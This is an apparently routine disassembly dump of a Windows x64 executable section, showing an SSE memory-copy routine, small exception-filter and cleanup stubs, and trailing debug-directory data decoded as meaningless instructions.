   14000b640:	00 15 b7 00 00 2c    	add    %dl,0x2c0000b7(%rip)        # 0x16c00b6fd
   14000b646:	b7 00                	mov    $0x0,%bh
   14000b648:	00 77 b6             	add    %dh,-0x4a(%rdi)
   14000b64b:	00 00                	add    %al,(%rax)
   14000b64d:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000b652:	c3                   	ret
   14000b653:	0f b7 0a             	movzwl (%rdx),%ecx
   14000b656:	66 89 08             	mov    %cx,(%rax)
   14000b659:	c3                   	ret
   14000b65a:	48 8b 0a             	mov    (%rdx),%rcx
   14000b65d:	48 89 08             	mov    %rcx,(%rax)
   14000b660:	c3                   	ret
   14000b661:	0f b7 0a             	movzwl (%rdx),%ecx
   14000b664:	44 0f b6 42 02       	movzbl 0x2(%rdx),%r8d
   14000b669:	66 89 08             	mov    %cx,(%rax)
   14000b66c:	44 88 40 02          	mov    %r8b,0x2(%rax)
   14000b670:	c3                   	ret
   14000b671:	0f b6 0a             	movzbl (%rdx),%ecx
   14000b674:	88 08                	mov    %cl,(%rax)
   14000b676:	c3                   	ret
   14000b677:	f3 0f 6f 02          	movdqu (%rdx),%xmm0
   14000b67b:	f3 0f 7f 00          	movdqu %xmm0,(%rax)
   14000b67f:	c3                   	ret
   14000b680:	4c 8b 02             	mov    (%rdx),%r8
   14000b683:	0f b7 4a 08          	movzwl 0x8(%rdx),%ecx
   14000b687:	44 0f b6 4a 0a       	movzbl 0xa(%rdx),%r9d
   14000b68c:	4c 89 00             	mov    %r8,(%rax)
   14000b68f:	66 89 48 08          	mov    %cx,0x8(%rax)
   14000b693:	44 88 48 0a          	mov    %r9b,0xa(%rax)
   14000b697:	49 8b cb             	mov    %r11,%rcx
   14000b69a:	c3                   	ret
   14000b69b:	8b 0a                	mov    (%rdx),%ecx
   14000b69d:	89 08                	mov    %ecx,(%rax)
   14000b69f:	c3                   	ret
   14000b6a0:	8b 0a                	mov    (%rdx),%ecx
   14000b6a2:	44 0f b6 42 04       	movzbl 0x4(%rdx),%r8d
   14000b6a7:	89 08                	mov    %ecx,(%rax)
   14000b6a9:	44 88 40 04          	mov    %r8b,0x4(%rax)
   14000b6ad:	c3                   	ret
   14000b6ae:	8b 0a                	mov    (%rdx),%ecx
   14000b6b0:	44 0f b7 42 04       	movzwl 0x4(%rdx),%r8d
   14000b6b5:	89 08                	mov    %ecx,(%rax)
   14000b6b7:	66 44 89 40 04       	mov    %r8w,0x4(%rax)
   14000b6bc:	c3                   	ret
   14000b6bd:	8b 0a                	mov    (%rdx),%ecx
   14000b6bf:	44 0f b7 42 04       	movzwl 0x4(%rdx),%r8d
   14000b6c4:	44 0f b6 4a 06       	movzbl 0x6(%rdx),%r9d
   14000b6c9:	89 08                	mov    %ecx,(%rax)
   14000b6cb:	66 44 89 40 04       	mov    %r8w,0x4(%rax)
   14000b6d0:	44 88 48 06          	mov    %r9b,0x6(%rax)
   14000b6d4:	c3                   	ret
   14000b6d5:	4c 8b 02             	mov    (%rdx),%r8
   14000b6d8:	8b 4a 08             	mov    0x8(%rdx),%ecx
   14000b6db:	44 0f b6 4a 0c       	movzbl 0xc(%rdx),%r9d
   14000b6e0:	4c 89 00             	mov    %r8,(%rax)
   14000b6e3:	89 48 08             	mov    %ecx,0x8(%rax)
   14000b6e6:	44 88 48 0c          	mov    %r9b,0xc(%rax)
   14000b6ea:	c3                   	ret
   14000b6eb:	4c 8b 02             	mov    (%rdx),%r8
   14000b6ee:	0f b6 4a 08          	movzbl 0x8(%rdx),%ecx
   14000b6f2:	4c 89 00             	mov    %r8,(%rax)
   14000b6f5:	88 48 08             	mov    %cl,0x8(%rax)
   14000b6f8:	c3                   	ret
   14000b6f9:	4c 8b 02             	mov    (%rdx),%r8
   14000b6fc:	0f b7 4a 08          	movzwl 0x8(%rdx),%ecx
   14000b700:	4c 89 00             	mov    %r8,(%rax)
   14000b703:	66 89 48 08          	mov    %cx,0x8(%rax)
   14000b707:	c3                   	ret
   14000b708:	4c 8b 02             	mov    (%rdx),%r8
   14000b70b:	8b 4a 08             	mov    0x8(%rdx),%ecx
   14000b70e:	4c 89 00             	mov    %r8,(%rax)
   14000b711:	89 48 08             	mov    %ecx,0x8(%rax)
   14000b714:	c3                   	ret
   14000b715:	4c 8b 02             	mov    (%rdx),%r8
   14000b718:	8b 4a 08             	mov    0x8(%rdx),%ecx
   14000b71b:	44 0f b7 4a 0c       	movzwl 0xc(%rdx),%r9d
   14000b720:	4c 89 00             	mov    %r8,(%rax)
   14000b723:	89 48 08             	mov    %ecx,0x8(%rax)
   14000b726:	66 44 89 48 0c       	mov    %r9w,0xc(%rax)
   14000b72b:	c3                   	ret
   14000b72c:	4c 8b 02             	mov    (%rdx),%r8
   14000b72f:	8b 4a 08             	mov    0x8(%rdx),%ecx
   14000b732:	44 0f b7 4a 0c       	movzwl 0xc(%rdx),%r9d
   14000b737:	44 0f b6 52 0e       	movzbl 0xe(%rdx),%r10d
   14000b73c:	4c 89 00             	mov    %r8,(%rax)
   14000b73f:	89 48 08             	mov    %ecx,0x8(%rax)
   14000b742:	66 44 89 48 0c       	mov    %r9w,0xc(%rax)
   14000b747:	44 88 50 0e          	mov    %r10b,0xe(%rax)
   14000b74b:	c3                   	ret
   14000b74c:	0f 10 04 0a          	movups (%rdx,%rcx,1),%xmm0
   14000b750:	4c 03 c1             	add    %rcx,%r8
   14000b753:	48 83 c1 10          	add    $0x10,%rcx
   14000b757:	41 f6 c3 0f          	test   $0xf,%r11b
   14000b75b:	74 13                	je     0x14000b770
   14000b75d:	0f 28 c8             	movaps %xmm0,%xmm1
   14000b760:	48 83 e1 f0          	and    $0xfffffffffffffff0,%rcx
   14000b764:	0f 10 04 0a          	movups (%rdx,%rcx,1),%xmm0
   14000b768:	48 83 c1 10          	add    $0x10,%rcx
   14000b76c:	41 0f 11 0b          	movups %xmm1,(%r11)
   14000b770:	4c 2b c1             	sub    %rcx,%r8
   14000b773:	4d 8b c8             	mov    %r8,%r9
   14000b776:	49 c1 e9 07          	shr    $0x7,%r9
   14000b77a:	74 7e                	je     0x14000b7fa
   14000b77c:	0f 29 41 f0          	movaps %xmm0,-0x10(%rcx)
   14000b780:	4c 3b 0d b1 98 00 00 	cmp    0x98b1(%rip),%r9        # 0x140015038
   14000b787:	76 0d                	jbe    0x14000b796
   14000b789:	e9 ae 00 00 00       	jmp    0x14000b83c
   14000b78e:	0f 29 41 e0          	movaps %xmm0,-0x20(%rcx)
   14000b792:	0f 29 49 f0          	movaps %xmm1,-0x10(%rcx)
   14000b796:	0f 10 04 0a          	movups (%rdx,%rcx,1),%xmm0
   14000b79a:	0f 10 4c 0a 10       	movups 0x10(%rdx,%rcx,1),%xmm1
   14000b79f:	48 81 c1 80 00 00 00 	add    $0x80,%rcx
   14000b7a6:	0f 29 41 80          	movaps %xmm0,-0x80(%rcx)
   14000b7aa:	0f 29 49 90          	movaps %xmm1,-0x70(%rcx)
   14000b7ae:	0f 10 44 0a a0       	movups -0x60(%rdx,%rcx,1),%xmm0
   14000b7b3:	0f 10 4c 0a b0       	movups -0x50(%rdx,%rcx,1),%xmm1
   14000b7b8:	49 ff c9             	dec    %r9
   14000b7bb:	0f 29 41 a0          	movaps %xmm0,-0x60(%rcx)
   14000b7bf:	0f 29 49 b0          	movaps %xmm1,-0x50(%rcx)
   14000b7c3:	0f 10 44 0a c0       	movups -0x40(%rdx,%rcx,1),%xmm0
   14000b7c8:	0f 10 4c 0a d0       	movups -0x30(%rdx,%rcx,1),%xmm1
   14000b7cd:	0f 29 41 c0          	movaps %xmm0,-0x40(%rcx)
   14000b7d1:	0f 29 49 d0          	movaps %xmm1,-0x30(%rcx)
   14000b7d5:	0f 10 44 0a e0       	movups -0x20(%rdx,%rcx,1),%xmm0
   14000b7da:	0f 10 4c 0a f0       	movups -0x10(%rdx,%rcx,1),%xmm1
   14000b7df:	75 ad                	jne    0x14000b78e
   14000b7e1:	0f 29 41 e0          	movaps %xmm0,-0x20(%rcx)
   14000b7e5:	49 83 e0 7f          	and    $0x7f,%r8
   14000b7e9:	0f 28 c1             	movaps %xmm1,%xmm0
   14000b7ec:	eb 0c                	jmp    0x14000b7fa
   14000b7ee:	0f 10 04 0a          	movups (%rdx,%rcx,1),%xmm0
   14000b7f2:	48 83 c1 10          	add    $0x10,%rcx
   14000b7f6:	49 83 e8 10          	sub    $0x10,%r8
   14000b7fa:	4d 8b c8             	mov    %r8,%r9
   14000b7fd:	49 c1 e9 04          	shr    $0x4,%r9
   14000b801:	74 16                	je     0x14000b819
   14000b803:	66 0f 1f 04 00       	nopw   (%rax,%rax,1)
   14000b808:	0f 11 41 f0          	movups %xmm0,-0x10(%rcx)
   14000b80c:	0f 10 04 0a          	movups (%rdx,%rcx,1),%xmm0
   14000b810:	48 83 c1 10          	add    $0x10,%rcx
   14000b814:	49 ff c9             	dec    %r9
   14000b817:	75 ef                	jne    0x14000b808
   14000b819:	49 83 e0 0f          	and    $0xf,%r8
   14000b81d:	74 0d                	je     0x14000b82c
   14000b81f:	49 8d 04 08          	lea    (%r8,%rcx,1),%rax
   14000b823:	0f 10 4c 02 f0       	movups -0x10(%rdx,%rax,1),%xmm1
   14000b828:	0f 11 48 f0          	movups %xmm1,-0x10(%rax)
   14000b82c:	0f 11 41 f0          	movups %xmm0,-0x10(%rcx)
   14000b830:	49 8b c3             	mov    %r11,%rax
   14000b833:	c3                   	ret
   14000b834:	0f 2b 41 e0          	movntps %xmm0,-0x20(%rcx)
   14000b838:	0f 2b 49 f0          	movntps %xmm1,-0x10(%rcx)
   14000b83c:	0f 18 84 0a 00 02 00 	prefetchnta 0x200(%rdx,%rcx,1)
   14000b843:	00 
   14000b844:	0f 10 04 0a          	movups (%rdx,%rcx,1),%xmm0
   14000b848:	0f 10 4c 0a 10       	movups 0x10(%rdx,%rcx,1),%xmm1
   14000b84d:	48 81 c1 80 00 00 00 	add    $0x80,%rcx
   14000b854:	0f 2b 41 80          	movntps %xmm0,-0x80(%rcx)
   14000b858:	0f 2b 49 90          	movntps %xmm1,-0x70(%rcx)
   14000b85c:	0f 10 44 0a a0       	movups -0x60(%rdx,%rcx,1),%xmm0
   14000b861:	0f 10 4c 0a b0       	movups -0x50(%rdx,%rcx,1),%xmm1
   14000b866:	49 ff c9             	dec    %r9
   14000b869:	0f 2b 41 a0          	movntps %xmm0,-0x60(%rcx)
   14000b86d:	0f 2b 49 b0          	movntps %xmm1,-0x50(%rcx)
   14000b871:	0f 10 44 0a c0       	movups -0x40(%rdx,%rcx,1),%xmm0
   14000b876:	0f 10 4c 0a d0       	movups -0x30(%rdx,%rcx,1),%xmm1
   14000b87b:	0f 18 84 0a 40 02 00 	prefetchnta 0x240(%rdx,%rcx,1)
   14000b882:	00 
   14000b883:	0f 2b 41 c0          	movntps %xmm0,-0x40(%rcx)
   14000b887:	0f 2b 49 d0          	movntps %xmm1,-0x30(%rcx)
   14000b88b:	0f 10 44 0a e0       	movups -0x20(%rdx,%rcx,1),%xmm0
   14000b890:	0f 10 4c 0a f0       	movups -0x10(%rdx,%rcx,1),%xmm1
   14000b895:	75 9d                	jne    0x14000b834
   14000b897:	0f ae f8             	sfence
   14000b89a:	e9 42 ff ff ff       	jmp    0x14000b7e1
   14000b89f:	49 03 c8             	add    %r8,%rcx
   14000b8a2:	0f 10 44 0a f0       	movups -0x10(%rdx,%rcx,1),%xmm0
   14000b8a7:	48 83 e9 10          	sub    $0x10,%rcx
   14000b8ab:	49 83 e8 10          	sub    $0x10,%r8
   14000b8af:	f6 c1 0f             	test   $0xf,%cl
   14000b8b2:	74 17                	je     0x14000b8cb
   14000b8b4:	48 8b c1             	mov    %rcx,%rax
   14000b8b7:	48 83 e1 f0          	and    $0xfffffffffffffff0,%rcx
   14000b8bb:	0f 10 c8             	movups %xmm0,%xmm1
   14000b8be:	0f 10 04 0a          	movups (%rdx,%rcx,1),%xmm0
   14000b8c2:	0f 11 08             	movups %xmm1,(%rax)
   14000b8c5:	4c 8b c1             	mov    %rcx,%r8
   14000b8c8:	4d 2b c3             	sub    %r11,%r8
   14000b8cb:	4d 8b c8             	mov    %r8,%r9
   14000b8ce:	49 c1 e9 07          	shr    $0x7,%r9
   14000b8d2:	74 62                	je     0x14000b936
   14000b8d4:	0f 29 01             	movaps %xmm0,(%rcx)
   14000b8d7:	eb 07                	jmp    0x14000b8e0
   14000b8d9:	0f 29 41 10          	movaps %xmm0,0x10(%rcx)
   14000b8dd:	0f 29 09             	movaps %xmm1,(%rcx)
   14000b8e0:	0f 10 44 0a f0       	movups -0x10(%rdx,%rcx,1),%xmm0
   14000b8e5:	0f 10 4c 0a e0       	movups -0x20(%rdx,%rcx,1),%xmm1
   14000b8ea:	48 81 e9 80 00 00 00 	sub    $0x80,%rcx
   14000b8f1:	0f 29 41 70          	movaps %xmm0,0x70(%rcx)
   14000b8f5:	0f 29 49 60          	movaps %xmm1,0x60(%rcx)
   14000b8f9:	0f 10 44 0a 50       	movups 0x50(%rdx,%rcx,1),%xmm0
   14000b8fe:	0f 10 4c 0a 40       	movups 0x40(%rdx,%rcx,1),%xmm1
   14000b903:	49 ff c9             	dec    %r9
   14000b906:	0f 29 41 50          	movaps %xmm0,0x50(%rcx)
   14000b90a:	0f 29 49 40          	movaps %xmm1,0x40(%rcx)
   14000b90e:	0f 10 44 0a 30       	movups 0x30(%rdx,%rcx,1),%xmm0
   14000b913:	0f 10 4c 0a 20       	movups 0x20(%rdx,%rcx,1),%xmm1
   14000b918:	0f 29 41 30          	movaps %xmm0,0x30(%rcx)
   14000b91c:	0f 29 49 20          	movaps %xmm1,0x20(%rcx)
   14000b920:	0f 10 44 0a 10       	movups 0x10(%rdx,%rcx,1),%xmm0
   14000b925:	0f 10 0c 0a          	movups (%rdx,%rcx,1),%xmm1
   14000b929:	75 ae                	jne    0x14000b8d9
   14000b92b:	0f 29 41 10          	movaps %xmm0,0x10(%rcx)
   14000b92f:	49 83 e0 7f          	and    $0x7f,%r8
   14000b933:	0f 28 c1             	movaps %xmm1,%xmm0
   14000b936:	4d 8b c8             	mov    %r8,%r9
   14000b939:	49 c1 e9 04          	shr    $0x4,%r9
   14000b93d:	74 15                	je     0x14000b954
   14000b93f:	66 0f 1f 04 00       	nopw   (%rax,%rax,1)
   14000b944:	0f 11 01             	movups %xmm0,(%rcx)
   14000b947:	48 83 e9 10          	sub    $0x10,%rcx
   14000b94b:	0f 10 04 0a          	movups (%rdx,%rcx,1),%xmm0
   14000b94f:	49 ff c9             	dec    %r9
   14000b952:	75 f0                	jne    0x14000b944
   14000b954:	49 83 e0 0f          	and    $0xf,%r8
   14000b958:	74 08                	je     0x14000b962
   14000b95a:	41 0f 10 0a          	movups (%r10),%xmm1
   14000b95e:	41 0f 11 0b          	movups %xmm1,(%r11)
   14000b962:	0f 11 01             	movups %xmm0,(%rcx)
   14000b965:	49 8b c3             	mov    %r11,%rax
   14000b968:	c3                   	ret
   14000b969:	90                   	nop
   14000b96a:	90                   	nop
   14000b96b:	90                   	nop
   14000b96c:	90                   	nop
   14000b96d:	90                   	nop
   14000b96e:	90                   	nop
   14000b96f:	90                   	nop
   14000b970:	ff e0                	jmp    *%rax
   14000b972:	90                   	nop
   14000b973:	90                   	nop
   14000b974:	53                   	push   %rbx
   14000b975:	55                   	push   %rbp
   14000b976:	57                   	push   %rdi
   14000b977:	48 83 ec 20          	sub    $0x20,%rsp
   14000b97b:	48 8b ea             	mov    %rdx,%rbp
   14000b97e:	83 3d a3 9f 00 00 00 	cmpl   $0x0,0x9fa3(%rip)        # 0x140015928
   14000b985:	74 09                	je     0x14000b990
   14000b987:	83 3d 96 9f 00 00 00 	cmpl   $0x0,0x9f96(%rip)        # 0x140015924
   14000b98e:	75 32                	jne    0x14000b9c2
   14000b990:	33 db                	xor    %ebx,%ebx
   14000b992:	48 39 5d 20          	cmp    %rbx,0x20(%rbp)
   14000b996:	0f 94 c3             	sete   %bl
   14000b999:	85 db                	test   %ebx,%ebx
   14000b99b:	74 0a                	je     0x14000b9a7
   14000b99d:	ff 15 5d 06 00 00    	call   *0x65d(%rip)        # 0x14000c000
   14000b9a3:	8b f8                	mov    %eax,%edi
   14000b9a5:	eb 02                	jmp    0x14000b9a9
   14000b9a7:	33 ff                	xor    %edi,%edi
   14000b9a9:	48 8b 55 48          	mov    0x48(%rbp),%rdx
   14000b9ad:	33 c9                	xor    %ecx,%ecx
   14000b9af:	ff 15 9b 06 00 00    	call   *0x69b(%rip)        # 0x14000c050
   14000b9b5:	85 db                	test   %ebx,%ebx
   14000b9b7:	74 09                	je     0x14000b9c2
   14000b9b9:	8b cf                	mov    %edi,%ecx
   14000b9bb:	ff 15 47 06 00 00    	call   *0x647(%rip)        # 0x14000c008
   14000b9c1:	90                   	nop
   14000b9c2:	48 83 c4 20          	add    $0x20,%rsp
   14000b9c6:	5f                   	pop    %rdi
   14000b9c7:	5d                   	pop    %rbp
   14000b9c8:	5b                   	pop    %rbx
   14000b9c9:	c3                   	ret
   14000b9ca:	90                   	nop
   14000b9cb:	90                   	nop
   14000b9cc:	55                   	push   %rbp
   14000b9cd:	48 83 ec 40          	sub    $0x40,%rsp
   14000b9d1:	48 8b ea             	mov    %rdx,%rbp
   14000b9d4:	48 8b 55 40          	mov    0x40(%rbp),%rdx
   14000b9d8:	33 c9                	xor    %ecx,%ecx
   14000b9da:	ff 15 70 06 00 00    	call   *0x670(%rip)        # 0x14000c050
   14000b9e0:	90                   	nop
   14000b9e1:	48 83 c4 40          	add    $0x40,%rsp
   14000b9e5:	5d                   	pop    %rbp
   14000b9e6:	c3                   	ret
   14000b9e7:	90                   	nop
   14000b9e8:	55                   	push   %rbp
   14000b9e9:	48 83 ec 20          	sub    $0x20,%rsp
   14000b9ed:	48 8b ea             	mov    %rdx,%rbp
   14000b9f0:	48 8b 01             	mov    (%rcx),%rax
   14000b9f3:	48 8b d1             	mov    %rcx,%rdx
   14000b9f6:	8b 08                	mov    (%rax),%ecx
   14000b9f8:	e8 b7 79 ff ff       	call   0x1400033b4
   14000b9fd:	90                   	nop
   14000b9fe:	48 83 c4 20          	add    $0x20,%rsp
   14000ba02:	5d                   	pop    %rbp
   14000ba03:	c3                   	ret
   14000ba04:	55                   	push   %rbp
   14000ba05:	48 8b ea             	mov    %rdx,%rbp
   14000ba08:	48 8b 01             	mov    (%rcx),%rax
   14000ba0b:	33 c9                	xor    %ecx,%ecx
   14000ba0d:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%rax)
   14000ba13:	0f 94 c1             	sete   %cl
   14000ba16:	8b c1                	mov    %ecx,%eax
   14000ba18:	5d                   	pop    %rbp
   14000ba19:	c3                   	ret
   14000ba1a:	90                   	nop
   14000ba1b:	90                   	nop
   14000ba1c:	55                   	push   %rbp
   14000ba1d:	48 83 ec 20          	sub    $0x20,%rsp
   14000ba21:	48 8b ea             	mov    %rdx,%rbp
   14000ba24:	48 8b 01             	mov    (%rcx),%rax
   14000ba27:	8b 08                	mov    (%rax),%ecx
   14000ba29:	e8 ae 82 ff ff       	call   0x140003cdc
   14000ba2e:	90                   	nop
   14000ba2f:	48 83 c4 20          	add    $0x20,%rsp
   14000ba33:	5d                   	pop    %rbp
   14000ba34:	c3                   	ret
   14000ba35:	90                   	nop
   14000ba36:	90                   	nop
   14000ba37:	90                   	nop
   14000ba38:	55                   	push   %rbp
   14000ba39:	48 83 ec 20          	sub    $0x20,%rsp
   14000ba3d:	48 8b ea             	mov    %rdx,%rbp
   14000ba40:	b9 02 00 00 00       	mov    $0x2,%ecx
   14000ba45:	48 83 c4 20          	add    $0x20,%rsp
   14000ba49:	5d                   	pop    %rbp
   14000ba4a:	e9 81 aa ff ff       	jmp    0x1400064d0
   14000ba4f:	90                   	nop
   14000ba50:	55                   	push   %rbp
   14000ba51:	48 83 ec 20          	sub    $0x20,%rsp
   14000ba55:	48 8b ea             	mov    %rdx,%rbp
   14000ba58:	48 8b 85 88 00 00 00 	mov    0x88(%rbp),%rax
   14000ba5f:	8b 08                	mov    (%rax),%ecx
   14000ba61:	48 83 c4 20          	add    $0x20,%rsp
   14000ba65:	5d                   	pop    %rbp
   14000ba66:	e9 65 aa ff ff       	jmp    0x1400064d0
   14000ba6b:	90                   	nop
   14000ba6c:	55                   	push   %rbp
   14000ba6d:	48 83 ec 20          	sub    $0x20,%rsp
   14000ba71:	48 8b ea             	mov    %rdx,%rbp
   14000ba74:	48 8b 45 48          	mov    0x48(%rbp),%rax
   14000ba78:	8b 08                	mov    (%rax),%ecx
   14000ba7a:	48 83 c4 20          	add    $0x20,%rsp
   14000ba7e:	5d                   	pop    %rbp
   14000ba7f:	e9 4c aa ff ff       	jmp    0x1400064d0
   14000ba84:	55                   	push   %rbp
   14000ba85:	48 83 ec 20          	sub    $0x20,%rsp
   14000ba89:	48 8b ea             	mov    %rdx,%rbp
   14000ba8c:	b9 05 00 00 00       	mov    $0x5,%ecx
   14000ba91:	48 83 c4 20          	add    $0x20,%rsp
   14000ba95:	5d                   	pop    %rbp
   14000ba96:	e9 35 aa ff ff       	jmp    0x1400064d0
   14000ba9b:	90                   	nop
   14000ba9c:	55                   	push   %rbp
   14000ba9d:	48 83 ec 20          	sub    $0x20,%rsp
   14000baa1:	48 8b ea             	mov    %rdx,%rbp
   14000baa4:	b9 07 00 00 00       	mov    $0x7,%ecx
   14000baa9:	48 83 c4 20          	add    $0x20,%rsp
   14000baad:	5d                   	pop    %rbp
   14000baae:	e9 1d aa ff ff       	jmp    0x1400064d0
   14000bab3:	90                   	nop
   14000bab4:	55                   	push   %rbp
   14000bab5:	48 83 ec 20          	sub    $0x20,%rsp
   14000bab9:	48 8b ea             	mov    %rdx,%rbp
   14000babc:	b9 04 00 00 00       	mov    $0x4,%ecx
   14000bac1:	48 83 c4 20          	add    $0x20,%rsp
   14000bac5:	5d                   	pop    %rbp
   14000bac6:	e9 05 aa ff ff       	jmp    0x1400064d0
   14000bacb:	90                   	nop
   14000bacc:	55                   	push   %rbp
   14000bacd:	48 83 ec 20          	sub    $0x20,%rsp
   14000bad1:	48 8b ea             	mov    %rdx,%rbp
   14000bad4:	33 c9                	xor    %ecx,%ecx
   14000bad6:	48 83 c4 20          	add    $0x20,%rsp
   14000bada:	5d                   	pop    %rbp
   14000badb:	e9 f0 a9 ff ff       	jmp    0x1400064d0
   14000bae0:	55                   	push   %rbp
   14000bae1:	48 83 ec 20          	sub    $0x20,%rsp
   14000bae5:	48 8b ea             	mov    %rdx,%rbp
   14000bae8:	80 bd 80 00 00 00 00 	cmpb   $0x0,0x80(%rbp)
   14000baef:	74 0b                	je     0x14000bafc
   14000baf1:	b9 03 00 00 00       	mov    $0x3,%ecx
   14000baf6:	e8 d5 a9 ff ff       	call   0x1400064d0
   14000bafb:	90                   	nop
   14000bafc:	48 83 c4 20          	add    $0x20,%rsp
   14000bb00:	5d                   	pop    %rbp
   14000bb01:	c3                   	ret
   14000bb02:	90                   	nop
   14000bb03:	90                   	nop
   14000bb04:	55                   	push   %rbp
   14000bb05:	48 83 ec 20          	sub    $0x20,%rsp
   14000bb09:	48 8b ea             	mov    %rdx,%rbp
   14000bb0c:	48 8b 4d 68          	mov    0x68(%rbp),%rcx
   14000bb10:	e8 ab c6 ff ff       	call   0x1400081c0
   14000bb15:	90                   	nop
   14000bb16:	48 83 c4 20          	add    $0x20,%rsp
   14000bb1a:	5d                   	pop    %rbp
   14000bb1b:	c3                   	ret
   14000bb1c:	55                   	push   %rbp
   14000bb1d:	48 83 ec 20          	sub    $0x20,%rsp
   14000bb21:	48 8b ea             	mov    %rdx,%rbp
   14000bb24:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000bb29:	48 83 c4 20          	add    $0x20,%rsp
   14000bb2d:	5d                   	pop    %rbp
   14000bb2e:	e9 9d a9 ff ff       	jmp    0x1400064d0
   14000bb33:	90                   	nop
   14000bb34:	55                   	push   %rbp
   14000bb35:	48 83 ec 20          	sub    $0x20,%rsp
   14000bb39:	48 8b ea             	mov    %rdx,%rbp
   14000bb3c:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000bb41:	48 83 c4 20          	add    $0x20,%rsp
   14000bb45:	5d                   	pop    %rbp
   14000bb46:	e9 85 a9 ff ff       	jmp    0x1400064d0
   14000bb4b:	90                   	nop
   14000bb4c:	55                   	push   %rbp
   14000bb4d:	48 83 ec 20          	sub    $0x20,%rsp
   14000bb51:	48 8b ea             	mov    %rdx,%rbp
   14000bb54:	48 8b 45 48          	mov    0x48(%rbp),%rax
   14000bb58:	8b 08                	mov    (%rax),%ecx
   14000bb5a:	48 83 c4 20          	add    $0x20,%rsp
   14000bb5e:	5d                   	pop    %rbp
   14000bb5f:	e9 40 b1 ff ff       	jmp    0x140006ca4
   14000bb64:	55                   	push   %rbp
   14000bb65:	48 83 ec 20          	sub    $0x20,%rsp
   14000bb69:	48 8b ea             	mov    %rdx,%rbp
   14000bb6c:	8b 4d 50             	mov    0x50(%rbp),%ecx
   14000bb6f:	48 83 c4 20          	add    $0x20,%rsp
   14000bb73:	5d                   	pop    %rbp
   14000bb74:	e9 2b b1 ff ff       	jmp    0x140006ca4
   14000bb79:	90                   	nop
   14000bb7a:	90                   	nop
   14000bb7b:	90                   	nop
   14000bb7c:	55                   	push   %rbp
   14000bb7d:	48 83 ec 20          	sub    $0x20,%rsp
   14000bb81:	48 8b ea             	mov    %rdx,%rbp
   14000bb84:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
   14000bb88:	48 83 c4 20          	add    $0x20,%rsp
   14000bb8c:	5d                   	pop    %rbp
   14000bb8d:	e9 2e c6 ff ff       	jmp    0x1400081c0
   14000bb92:	90                   	nop
   14000bb93:	90                   	nop
   14000bb94:	55                   	push   %rbp
   14000bb95:	48 83 ec 20          	sub    $0x20,%rsp
   14000bb99:	48 8b ea             	mov    %rdx,%rbp
   14000bb9c:	48 8b 01             	mov    (%rcx),%rax
   14000bb9f:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%rax)
   14000bba5:	74 0c                	je     0x14000bbb3
   14000bba7:	81 38 1d 00 00 c0    	cmpl   $0xc000001d,(%rax)
   14000bbad:	74 04                	je     0x14000bbb3
   14000bbaf:	33 c0                	xor    %eax,%eax
   14000bbb1:	eb 05                	jmp    0x14000bbb8
   14000bbb3:	b8 01 00 00 00       	mov    $0x1,%eax
   14000bbb8:	48 83 c4 20          	add    $0x20,%rsp
   14000bbbc:	5d                   	pop    %rbp
   14000bbbd:	c3                   	ret
   14000bbbe:	90                   	nop
   14000bbbf:	90                   	nop
   14000bbc0:	55                   	push   %rbp
   14000bbc1:	48 83 ec 20          	sub    $0x20,%rsp
   14000bbc5:	48 8b ea             	mov    %rdx,%rbp
   14000bbc8:	48 8b 01             	mov    (%rcx),%rax
   14000bbcb:	33 c9                	xor    %ecx,%ecx
   14000bbcd:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%rax)
   14000bbd3:	0f 94 c1             	sete   %cl
   14000bbd6:	8b c1                	mov    %ecx,%eax
   14000bbd8:	48 83 c4 20          	add    $0x20,%rsp
   14000bbdc:	5d                   	pop    %rbp
   14000bbdd:	c3                   	ret
   14000bbde:	90                   	nop
   14000bbdf:	90                   	nop
   14000bbe0:	00 00                	add    %al,(%rax)
   14000bbe2:	00 00                	add    %al,(%rax)
   14000bbe4:	e6 17                	out    %al,$0x17
   14000bbe6:	ba 55 00 00 00       	mov    $0x55,%edx
   14000bbeb:	00 02                	add    %al,(%rdx)
   14000bbed:	00 00                	add    %al,(%rax)
   14000bbef:	00 18                	add    %bl,(%rax)
   14000bbf1:	01 00                	add    %eax,(%rax)
   14000bbf3:	00 38                	add    %bh,(%rax)
   14000bbf5:	bc 00 00 38 b0       	mov    $0xb0380000,%esp
   14000bbfa:	00 00                	add    %al,(%rax)
   14000bbfc:	00 00                	add    %al,(%rax)
   14000bbfe:	00 00                	add    %al,(%rax)
   14000bc00:	e6 17                	out    %al,$0x17
   14000bc02:	ba 55 00 00 00       	mov    $0x55,%edx
   14000bc07:	00 0d 00 00 00 90    	add    %cl,-0x70000000(%rip)        # 0xd000bc0d
   14000bc0d:	03 00                	add    (%rax),%eax
   14000bc0f:	00 5c 2a 01          	add    %bl,0x1(%rdx,%rbp,1)
   14000bc13:	00 5c 1c 01          	add    %bl,0x1(%rsp,%rbx,1)
   14000bc17:	00 00                	add    %al,(%rax)
   14000bc19:	00 00                	add    %al,(%rax)
   14000bc1b:	00 e6                	add    %ah,%dh
   14000bc1d:	17                   	(bad)
   14000bc1e:	ba 55 35 02 70       	mov    $0x70023555,%edx
   14000bc23:	22 0a                	and    (%rdx),%cl
   14000bc25:	00 00                	add    %al,(%rax)
   14000bc27:	00 04 00             	add    %al,(%rax,%rax,1)
   14000bc2a:	00 00                	add    %al,(%rax)
   14000bc2c:	34 bc                	xor    $0xbc,%al
   14000bc2e:	00 00                	add    %al,(%rax)
   14000bc30:	34 b0                	xor    $0xb0,%al
   14000bc32:	00 00                	add    %al,(%rax)
   14000bc34:	70 22                	jo     0x14000bc58
   14000bc36:	00 bb 52 53 44 53    	add    %bh,0x53445352(%rbx)
   14000bc3c:	db 7d 51             	fstpt  0x51(%rbp)
   14000bc3f:	16                   	(bad)
   14000bc40:	8e e0                	mov    %eax,%fs
   14000bc42:	ae                   	scas   (%rdi),%al
   14000bc43:	49 a8 ba             	rex.WB test $0xba,%al
   14000bc46:	55                   	push   %rbp
   14000bc47:	64 4e 8f             	fs rex.WRX (bad)
   14000bc4a:	b2 16                	mov    $0x16,%dl
   14000bc4c:	02 00                	add    (%rax),%al
   14000bc4e:	00 00                	add    %al,(%rax)
   14000bc50:	50                   	push   %rax
